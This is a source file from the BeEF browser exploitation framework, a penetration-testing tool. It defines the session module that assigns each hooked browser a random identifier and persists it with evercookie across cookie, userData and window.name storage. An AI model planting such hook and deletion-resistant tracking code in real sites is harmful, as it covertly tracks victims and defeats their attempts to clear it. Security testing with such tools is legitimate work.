//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.session
 *
 * Provides basic session functions.
 */
beef.session = {
	
	hook_session_id_length: 80,
	hook_session_id_chars: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",	
	ec: new evercookie(),
    beefhook: "<%= @hook_session_name %>",
	
	/**
	 * Gets a string which will be used to identify the hooked browser session
	 * 
	 * @example: var hook_session_id = beef.session.get_hook_session_id();
	 */
  	get_hook_session_id: function() {
		// check if the browser is already known to the framework
		var id = this.ec.evercookie_cookie(beef.session.beefhook);
		if (typeof id == 'undefined') {
			var id = this.ec.evercookie_userdata(beef.session.beefhook);
		}
		if (typeof id == 'undefined') {
			var id = this.ec.evercookie_window(beef.session.beefhook);
		}
		
		// if the browser is not known create a hook session id and set it
		if ((typeof id == 'undefined') || (id == null)) {
			id = this.gen_hook_session_id();
			this.set_hook_session_id(id);
		}
		
		// return the hooked browser session identifier
		return id;
	},
	
	/**
	 * Sets a string which will be used to identify the hooked browser session
	 * 
	 * @example: beef.session.set_hook_session_id('RANDOMSTRING');
	 */
  	set_hook_session_id: function(id) {
		// persist the hook session id
		this.ec.evercookie_cookie(beef.session.beefhook, id);
		this.ec.evercookie_userdata(beef.session.beefhook, id);
		this.ec.evercookie_window(beef.session.beefhook, id);
	},
	
	/**
	 * Generates a random string using the chars in hook_session_id_chars.
	 * 
	 * @example: beef.session.gen_hook_session_id();
	 */
  	gen_hook_session_id: function() {
	    // init the return value
		var hook_session_id = "";
		
		// construct the random string 
		for(var i=0; i<this.hook_session_id_length; i++) {
		  var rand_num = Math.floor(Math.random()*this.hook_session_id_chars.length);
		  hook_session_id += this.hook_session_id_chars.charAt(rand_num);
		}
		
		return hook_session_id;
	}
};

beef.regCmp('beef.session');
